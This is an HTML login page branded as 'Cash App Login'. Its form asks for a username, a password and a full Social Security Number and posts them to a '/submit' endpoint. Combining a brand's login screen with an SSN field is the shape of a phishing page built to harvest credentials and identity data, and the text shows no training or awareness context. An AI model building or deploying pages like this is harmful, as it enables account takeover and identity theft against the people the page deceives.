<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cash App Login</title>
    <link rel="stylesheet" href="styles.css"> <!-- Link to external CSS -->
    <script defer src="script.js"></script> <!-- Link to external JavaScript -->
</head>
<body>

    <div class="login-container">
        <form id="loginForm" action="/submit" method="POST">
            <h2>Cash App Login</h2>

            <!-- Username Field -->
            <label for="username">Username:</label>
            <input type="text" id="username" name="username" required>

            <!-- Password Field -->
            <label for="password">Password:</label>
            <input type="password" id="password" name="password" required>

            <!-- Social Security Number Field -->
            <div class="social-container">
                <label for="social">Social Security Number (SSN):</label>
                <input type="text" id="social" name="social" placeholder="XXX-XX-XXXX" required>
            </div>

            <!-- Login Button -->
            <button type="submit" class="login-btn">Log In</button>
        </form>
    </div>

</body>
</html>
